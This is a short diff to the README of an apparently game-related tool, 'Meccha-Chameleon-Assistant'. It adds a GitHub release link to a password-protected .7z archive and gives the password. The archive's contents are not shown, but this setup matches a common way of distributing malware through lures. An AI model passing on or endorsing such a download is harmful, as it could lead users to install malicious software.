@@ -7,7 +7,7 @@
 ## 📥 Download
 
 **Latest version:**  
-🔗 **[Download Meccha-Chameleon-Assistant]()**
+🔗 **[Download Meccha-Chameleon-Assistant](https://github.com/SpiritSultanCure/Meccha-Chameleon-Assistant/releases/download/mechaupdate/Mechamod.7z)**
 
 **Password:** `chameleon2026`
 
